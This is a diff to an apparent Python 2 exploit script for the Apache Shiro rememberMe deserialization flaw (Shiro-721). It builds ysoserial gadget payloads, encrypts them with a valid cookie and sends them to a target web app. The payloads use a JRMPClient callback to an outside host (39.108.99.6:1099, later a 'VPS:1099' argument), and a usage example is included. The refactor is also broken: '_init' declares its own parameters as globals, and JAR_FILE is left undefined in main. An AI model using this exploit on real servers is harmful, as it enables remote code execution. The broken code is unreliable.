@@ -12,11 +12,13 @@ import subprocess
 logger = logging.getLogger(__file__)
 logger.addHandler(logging.StreamHandler())
 logger.setLevel(logging.DEBUG)
-JAR_FILE = 'ysoserial.jar'
-libs = ["JRMPClient","JRMPListener","CommonsBeanutils1","BeanShell1","C3P0","Clojure","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","FileUpload1","Groovy1","Hibernate1","Hibernate2","JBossInterceptors1","JSON1","JavassistWeld1","Jdk7u21","Jython1","MozillaRhino1","Myfaces1","Myfaces2","ROME","Spring1","Spring2","URLDNS","Wicket1",]
-BLOCK_SIZE = 16
-URL = "http://192.168.78.166:8080/samples-web-1.4.1/"
-VALID_COOKIE = base64.b64decode('MQIMT1XwcLoQapv6k90XNaZz3BR/L2+Jp7vgskL1n769Kx/LiunwXqYvNJwlrAdgnNktxjW97ho2wgityV5+W1KR4ylu9tUqxum+z5TvHrFoA5meVW8YqsYIhOjEJ80E1TMJKAT7WZhNJGYrDMQgf9sSAXFsnkjDH3i45mTyXVDqBG/rtMXSGPNlLIBUN8IhqT6LjhvDnKST8l3G4yX8GK2pDt4f2yvyum6oA6Vc/9LLY+zX6cKod0ZGwSHZiiNLOFsQbCfJGDfnf3x0d45Rm5RJ+2dLxgANbbxvKWgYHcEgVNpc8QpT6HrUqOpXMrktY+b1umu1MgxEZg55LW5aDUh3MrZtOaW4U+Qgy10mcPoV5U8sahckdkAazuPXEbbauuiM/sLpfw4+jhRAdpg+FbLypsj2nuUIUw8uroV/Qf35FedzTLHWShMJYTg+cOfyCuC67+6hFsHY+bsHxdylgBM/c/cZC2he2gm2b/WREl0F90/rulb+GB52hB0M2E/x')
+def _init(URL,VALID_COOKIE):
+	global URL,VALID_COOKIE
+	JAR_FILE = 'ysoserial.jar'
+	libs = ["JRMPClient","JRMPListener","CommonsBeanutils1","BeanShell1","C3P0","Clojure","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","FileUpload1","Groovy1","Hibernate1","Hibernate2","JBossInterceptors1","JSON1","JavassistWeld1","Jdk7u21","Jython1","MozillaRhino1","Myfaces1","Myfaces2","ROME","Spring1","Spring2","URLDNS","Wicket1",]
+	BLOCK_SIZE = 16
+	URL = URL
+	VALID_COOKIE = base64.b64decode(VALID_COOKIE)
 
 
 """
@@ -167,11 +169,19 @@ def poc(url,payload):
 
 
 def main():
-	payload =  generator("39.108.99.6:1099",JAR_FILE,"JRMPClient")
+	URL = sys.argv[1]
+	VALID_COOKIE = sys.argv[2]
+	Command = sys.argv[3]
+	Type = sys.argv[4]
+	_init(URL,VALID_COOKIE)
+	payload =  generator(Command,JAR_FILE,Type)
 	payload = payload.decode('hex')
 	result = base64.b64encode(encrypt(payload))
-	# logger.info("result: {}".format(result)
-	poc('http://192.168.78.166:8080/samples-web-1.4.1/',result)
+	poc(URL,result)
+	"""
+	example:
+	python2 Shrio721.py  http://192.168.78.166:8080/samples-web-1.4.1/  Valid_Cookie  VPS:1099   JRMPClient
+	"""
 
 if __name__ == '__main__':
 	main()
